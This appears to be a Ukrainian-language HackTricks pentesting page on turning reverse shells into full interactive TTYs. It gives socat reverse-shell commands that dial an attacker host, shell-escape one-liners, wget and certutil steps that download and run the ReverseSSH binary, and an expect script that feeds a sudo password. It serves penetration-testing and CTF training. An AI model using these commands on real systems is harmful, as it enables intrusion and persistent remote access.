# Повноцінні TTY

{{#include ../../banners/hacktricks-training.md}}

## Повноцінний TTY

`/etc/shells` містить шляхи до дозволених login-shell і використовується деякими програмами; він не є універсальною передумовою для виділення PTY.<sup>[[3]](#references)[[4]](#references)</sup> Якщо програма на кшталт `pkexec` відхиляє `SHELL` із повідомленням `The value for the SHELL variable was not found in the /etc/shells file`, переконайтеся, що точний шлях до shell (наприклад, `/bin/bash`) зазначений у `/etc/shells`.<sup>[[10]](#references)</sup> Наведена нижче послідовність відновлення `CTRL+Z`/`fg` використовує керування завданнями Bash; якщо поточний shell не є Bash, запустіть Bash перед використанням цієї послідовності.<sup>[[7]](#references)</sup>

#### Python

`pty.spawn` у Python запускає програму, підключену до стандартних потоків вводу, виводу та помилок поточного процесу, завдяки чому Bash отримує псевдотермінал у цьому сеансі.<sup>[[4]](#references)</sup>
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> [!TIP]
> Ви можете отримати **number** **rows** і **columns**, виконавши **`stty -a`**; `-a` виводить усі поточні налаштування термінала. Вивід команди залежить від термінала, тому використовуйте значення, отримані в поточній сесії.<sup>[[11]](#references)</sup>

#### script

Утиліта `script` записує сесію термінала; тут `/dev/null` відкидає typescript, `-q` приховує повідомлення про початок і завершення, а `-c` запускає Bash замість shell за замовчуванням.<sup>[[5]](#references)</sup>
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
```
Після будь-якого методу PTY-spawn призупиніть сесію Netcat і відновіть її з локальним raw mode, потім налаштуйте середовище та розміри віддаленого термінала:
```bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat

Listener використовує поточний terminal у raw mode із вимкненим local echo та приймає TCP-з'єднання на порту 4444. Команда на victim виділяє pty, об'єднує stderr, створює session, пересилає SIGINT і застосовує sane terminal settings; додайте `ctty`, якщо дочірньому процесу потрібен controlling terminal.<sup>[[6]](#references)</sup>
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap (старі версії з `--interactive`): `!sh`

Escape Nmap залежить від версії: у новіших релізах Nmap видалив режим `--interactive`, тому `!sh` застосовується лише до старих версій.<sup>[[13]](#references)</sup>

## ReverseSSH

Зручний спосіб отримати **interactive shell access**, а також виконувати **file transfers** і **port forwarding** — розмістити на target статично скомпонований ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh).<sup>[[1]](#references)</sup>

Нижче наведено приклад для `x86` із опублікованим UPX-compressed binary проєкту. Для інших архітектур або release artifacts використовуйте [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/) як навігацію.<sup>[[1]](#references)</sup>

1. Підготуйте локальний host для приймання вхідного SSH-з'єднання. У listener mode параметр `-l` вмикає listener, а `-p 4444` вибирає порт, на якому він прийматиме з'єднання від target.<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux target. Transfer the same `upx_reverse-sshx86` artifact to `/dev/shm/reverse-ssh` and make it executable. The target's `-p 4444` selects the listener port above, and `kali@10.0.0.2` supplies the account and host used to dial home.<sup>[[1]](#references)</sup>
```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows target. Full interactive PowerShell requires Windows 10 build 17763; див. [project README](https://github.com/Fahrj/reverse-ssh#features).<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
Приклад для Windows використовує `certutil` з параметром `-f -urlcache`; Microsoft описує `-f` як примусове отримання URL і зазначає, що доступні параметри можуть відрізнятися залежно від версії, тому перевірте `certutil -?`, якщо ця форма недоступна.<sup>[[12]](#references)</sup>

- Після успішного встановлення reverse connection listener ReverseSSH у reverse-mode за замовчуванням прив'язується до порту `8888` (або до значення, переданого через `-b`), а вхідні з'єднання приймають будь-яке ім'я користувача зі стандартним паролем `letmeinbrudipls`. Remote shell працює з привілеями облікового запису, від імені якого було запущено `reverse-ssh(.exe)`.<sup>[[1]](#references)</sup>
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) автоматично оновлює Unix-подібні reverse shells до PTY, змінює розмір Unix-подібних терміналів і веде журнал взаємодій із shell; для Windows shells вона надає readline, але не підтримує зміну розміру термінала в реальному часі.<sup>[[2]](#references)</sup>

![Інтерфейс обробника reverse shell Penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

Запустіть `penelope`, щоб за замовчуванням прослуховувати `0.0.0.0:4444`; після цього вхідні Unix-подібні shells можуть автоматично оновлюватися та записуватися в журнал.<sup>[[2]](#references)</sup>

![Обробка та оновлення вхідного shell у Penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

Якщо з певної причини ви не можете отримати full TTY, ви **все одно можете взаємодіяти з програмами**, які очікують на введення користувача. У наведеному прикладі Expect запускає `sudo`, очікує на запит пароля, надсилає пароль і повертає керування за допомогою `interact`; `sudo -S` читає пароль зі стандартного введення. Використовуйте це лише в авторизованій лабораторії та не зберігайте реальні облікові дані в історії shell або файлах із вихідним кодом.<sup>[[8]](#references)[[9]](#references)</sup>
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## References

- [1] [ReverseSSH - статично скомпільований ssh-сервер із функцією reverse shell для CTF та подібних завдань](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - обробник shell, який автоматизує деякі дії для спрощення роботи](https://github.com/brightio/penelope)
- [3] [shells(5) — сторінка посібника Linux](https://man7.org/linux/man-pages/man5/shells.5.html)
- [4] [Python `pty` — документація Python](https://docs.python.org/3/library/pty.html)
- [5] [script(1) — сторінка посібника Linux](https://man7.org/linux/man-pages/man1/script.1.html)
- [6] [socat(1) — сторінка посібника Linux](https://man7.org/linux/man-pages/man1/socat.1.html)
- [7] [Довідковий посібник Bash — керування завданнями](https://www.gnu.org/s/bash/manual/bash.html)
- [8] [sudo(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [9] [expect(1) — сторінка посібника Linux](https://man7.org/linux/man-pages/man1/expect.1.html)
- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
- [11] [stty(1) — сторінка посібника Linux](https://man7.org/linux/man-pages/man1/stty.1.html)
- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Журнал змін Nmap](https://nmap.org/changelog.html)
{{#include ../../banners/hacktricks-training.md}}
